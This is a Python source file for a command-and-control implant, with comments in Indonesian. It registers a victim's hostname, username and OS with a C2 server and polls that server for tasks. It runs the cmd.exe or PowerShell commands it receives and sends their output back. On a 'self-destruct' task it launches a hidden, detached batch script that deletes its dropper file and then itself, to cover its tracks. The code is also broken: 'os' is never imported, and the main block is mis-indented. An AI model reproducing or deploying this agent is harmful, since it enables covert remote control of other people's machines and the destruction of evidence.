# agent_dalang.py

import requests
import subprocess
import time
import random
import socket
import getpass
import platform
import sys  # DIUBAH: Tambahkan import sys untuk keluar dari script

# --- KONFIGURASI ---
C2_URL = "http://192.168.1.100:5000" 
AGENT_ID = None
# Variabel global untuk menyimpan path file .bat yang akan dihapus
BAT_TO_DELETE = None 

def register_agent():
    global AGENT_ID
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info = f"{platform.system()} {platform.release()}"
    payload = {"hostname": hostname, "username": username, "os": os_info}
    try:
        response = requests.post(f"{C2_URL}/api/register", json=payload, timeout=5)
        response.raise_for_status()
        data = response.json()
        AGENT_ID = data.get("agent_id")
        print(f"[+] Berhasil mendaftar. Agent ID: {AGENT_ID}")
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal terhubung ke C2: {e}")
        AGENT_ID = None

def get_task():
    if not AGENT_ID: return None
    try:
        url = f"{C2_URL}/api/tasks/{AGENT_ID}"
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengambil tugas: {e}")
        return None

def execute_task(task):
    tool = task.get("tool")
    command = task.get("command")
    if tool not in ["cmd.exe", "powershell"]:
        return "Error: Tool tidak didukung."
    try:
        if tool == "cmd.exe": full_command = [tool, "/c", command]
        else: full_command = [tool, "-Command", command]
        result = subprocess.run(full_command, capture_output=True, text=True, shell=True)
        output = result.stdout if result.stdout else ""
        output += result.stderr if result.stderr else ""
        return output if output else "Perintah dieksekusi tanpa output."
    except Exception as e:
        return f"Error saat eksekusi: {str(e)}"

def send_results(task_id, output):
    if not AGENT_ID or task_id == "none": return
    payload = {"task_id": task_id, "output": output}
    try:
        url = f"{C2_URL}/api/results"
        requests.post(url, json=payload, timeout=5)
        print(f"[+] Hasil untuk Task ID {task_id} berhasil dikirim.")
    except requests.exceptions.RequestException as e:
        print(f"[!] Gagal mengirim hasil: {e}")


def main_loop():
    """Loop utama untuk operasional agent."""
    register_agent()

    while True:
        if not AGENT_ID:
            print("[!] Pendaftaran gagal. Mencoba lagi dalam 60 detik...")
            time.sleep(60)
            register_agent()
            continue

        task = get_task()

        if task:
            task_id = task.get("task_id")
            command = task.get("command")
            tool = task.get("tool")

            # --- BLOK LOGIKA BARU UNTUK TERMINATE ---
            if tool == "internal" and command == "self-destruct":
                print("[!] Menerima perintah terminate & self-destruct.")
                send_results(task_id, "Agent terminated successfully. Footprint cleanup initiated.")
                
                if BAT_TO_DELETE and os.path.exists(BAT_TO_DELETE):
                    # Buat skrip .bat pembersih di direktori TEMP
                    cleanup_script_path = os.path.join(os.environ["TEMP"], "cleanup.bat")
                    with open(cleanup_script_path, "w") as f:
                        f.write(f'@echo off\n')
                        f.write(f'ECHO [*] Membersihkan jejak masuk...\n')
                        f.write(f'timeout /t 2 /nobreak > NUL\n') # Beri waktu agar proses python mati
                        f.write(f'del "{BAT_TO_DELETE}"\n') # Hapus file .bat asli
                        f.write(f'(goto) 2>nul & del "%~f0"') # Hapus skrip pembersih ini sendiri
                    
                    # Jalankan skrip pembersih di proses baru yang terpisah dan tersembunyi
                    subprocess.Popen(
                        ['cmd.exe', '/c', cleanup_script_path],
                        creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
                    )
                    print(f"[*] Skrip pembersih diluncurkan untuk menghapus {BAT_TO_DELETE}")

                sys.exit(0) # Perintah untuk keluar dari script

            if command == "sleep":
                sleep_duration = task.get("duration", 30)
                print(f"[*] Tidak ada tugas. Tidur selama {sleep_duration} detik.")
                time.sleep(sleep_duration)
            else:
                print(f"[*] Menerima tugas baru: {command}")
                output = execute_task(task)
                send_results(task_id, output)
                time.sleep(random.randint(5, 10))
        else:
            time.sleep(30)

if __name__ == "__main__":
if len(sys.argv) > 1:
        BAT_TO_DELETE = sys.argv[1]
        print(f"[INFO] Agent akan menghapus jejak file: {BAT_TO_DELETE} saat di-terminate.")
    
main_loop()
